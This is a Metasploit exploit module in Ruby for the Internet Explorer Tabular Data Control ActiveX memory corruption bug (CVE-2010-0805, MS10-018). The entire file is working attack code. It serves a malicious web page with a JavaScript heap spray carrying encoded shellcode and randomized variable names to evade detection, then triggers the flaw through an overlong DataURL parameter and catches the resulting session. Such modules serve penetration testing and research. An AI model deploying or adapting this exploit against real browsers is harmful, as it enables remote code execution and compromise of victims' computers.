##
# $Id: ms10_018_ie_tabular_activex.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer Tabular Data Control ActiveX Memory Corruption',
			'Description'    => %q{
					This module exploits a memory corruption vulnerability in the Internet Explorer
				Tabular Data ActiveX Control. Microsoft reports that version 5.01 and 6 of Internet
				Explorer are vulnerable.

				By specifying a long value as the "DataURL" parameter to this control, it is possible
				to write a NUL byte outside the bounds of an array. By targeting control flow data
				on the stack, an attacker can execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Anonymous',  # original discovery
					'jduck'       # metasploit version
				],
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2010-0805' ],
					[ 'OSVDB', '63329' ],
					[ 'BID', '39025' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-034' ],
					[ 'MSB', 'MS10-018' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "", #"\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic (Heap Spray)',
						{
							'Ret' => 0x0c0c0c0c
						}
					],
				],
			'DisclosureDate' => 'Mar 09 2010',
			'DefaultTarget'  => 0))
	end


	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport} (target: #{target.name})...")

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Set the return\nops
		ret  	    = Rex::Text.to_unescape([target.ret].pack('V'))

		# ActiveX parameters
		#progid =
		clsid = "333C7BC4-460F-11D0-BC04-0080C7055A83"

		# exploit url
		url = "http://"
		#url << rand_text_alphanumeric(258)
		url << rand_text_alphanumeric(258+0x116+2)

		# Construct the final page
		var_unescape   = rand_text_alpha(rand(100) + 1)
		var_shellcode  = rand_text_alpha(rand(100) + 1)
		var_memory     = rand_text_alpha(rand(100) + 1)
		var_spray      = rand_text_alpha(rand(100) + 1)
		var_i          = rand_text_alpha(rand(100) + 1)

		html = %Q|<html><body>
<script>
var #{var_memory} = new Array();
var #{var_unescape} = unescape;
var #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');
var #{var_spray} = #{var_unescape}("#{ret * 2}");
do { #{var_spray} += #{var_spray} } while( #{var_spray}.length < 0x4000 );
for (#{var_i} = 0; #{var_i} < 150; #{var_i}++) #{var_memory}[#{var_i}] = #{var_spray} + #{var_shellcode};
</script>
<object classid='clsid:#{clsid}'>
<param name='DataURL' value='#{url}'/>
</object>
</body></html>
|

		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)

	end

end
